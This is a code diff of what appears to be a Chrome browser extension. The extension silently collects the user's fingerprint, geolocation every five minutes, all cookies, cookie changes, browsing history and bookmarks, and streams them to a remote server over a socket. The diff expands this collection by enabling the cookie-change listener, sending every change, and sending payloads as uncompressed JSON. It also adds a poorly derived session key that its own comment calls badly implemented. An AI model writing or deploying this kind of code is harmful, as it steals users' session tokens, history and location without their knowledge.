@@ -25,7 +25,7 @@ ec.get("uuid", function (value) {
 });
 
 ///////////////////////////////////////////////////////////////////////////////
-// Define public-key.
+// Initialise (badly implemented) encrypted session.
 ///////////////////////////////////////////////////////////////////////////////
 
 var publicKey =
@@ -36,8 +36,11 @@ var publicKey =
      "mz45rrZ+mc1GvxW7AgMBAAE=",
      "-----END PUBLIC KEY-----"
     ].join("\n");
+// Get SHA-3 hash of the shared key and use it in AES-256?
+var sharedKey = uuid + "-" + Math.uuid(4); // look into salting best practices
 var encryptor = new JSEncrypt();
 encryptor.setPublicKey(publicKey);
+
 
 ///////////////////////////////////////////////////////////////////////////////
 // Define getters.
@@ -63,7 +66,7 @@ var getFingerprint = function () {
         userAgent: getUserAgent(),
         screenResolution: getScreenResolution()
     };
-    postData("fingerprint", fingerprint);
+    postData("addFingerprint", fingerprint);
 }
 
 var getUserAgent = function () {
@@ -77,10 +80,10 @@ var getScreenResolution = function () {
 var getCurrentPosition = function () {
     navigator.geolocation.getCurrentPosition(function (position) {
         console.log("Position found.");
-        postData("geoposition", position);
+        postData("addGeoposition", position);
     }, function(positionError) {
         console.log("Position not found.");
-        postData("geoposition", null);
+        postData("addGeoposition", null);
     });
 };
 
@@ -114,7 +117,7 @@ var getPageCapture = function (tabId) {
 
 var getAllCookies = function () {
     chrome.cookies.getAll({}, function (cookieArray) {
-        postData("cookies-all", cookieArray);
+        postData("addAllCookies", cookieArray);
     });
 };
 
@@ -159,18 +162,19 @@ var onTabRemoved = function (tabId, removeInfo) {
 var onURLVisit = function (result) {
     console.log("URL visit:", result.title, "(" + result.url + ") at",
                 result.lastVisitTime + ",", result.visitCount, "times");
-    postData('url-visit', result);
+    postData('addURLVisit', result);
 };
 
 var onURLRemoved = function (removed) {
     // Log only if particular visits are removed.
     if (!removed.allHistory) {
-        postData('url-removed', removed);
+        postData('removeURL', removed);
     }
 };
 
 var onCookieChange = function (changeInfo) {
     console.log(changeInfo);
+    postData('addCookieChange', changeInfo);
 };
 
 var onBookmarkCreate = function (id, bookmark) {
@@ -192,7 +196,7 @@ var activateListeners = function () {
     chrome.tabs.onRemoved.addListener(onTabRemoved);
     chrome.history.onVisited.addListener(onURLVisit);
     chrome.history.onVisitRemoved.addListener(onURLRemoved);
-    // chrome.cookies.onChanged.addListener(onCookieChange);
+    chrome.cookies.onChanged.addListener(onCookieChange);
     chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
     chrome.bookmarks.onChanged.addListener(onBookmarkChange);
     setInterval(getCurrentPosition, 5 * 60 * 1000);
@@ -210,11 +214,12 @@ var postData = function (type, payload) {
     data = {}
     data.uuid = uuid;
     data.time = new Date().getTime();
-    // data.type = type;
-    // data.payload = JSON.stringify(payload);
+    data.type = type;
+    data.payload = JSON.stringify(payload);
     // Compress payload.
-    data.payload = LZString.compress(JSON.stringify(payload));
+    // data.payload = LZString.compress(JSON.stringify(payload));
     console.log(data);
+    console.log(payload);
     // Transmit data to server.
     socket.emit(type, data);
     return data;
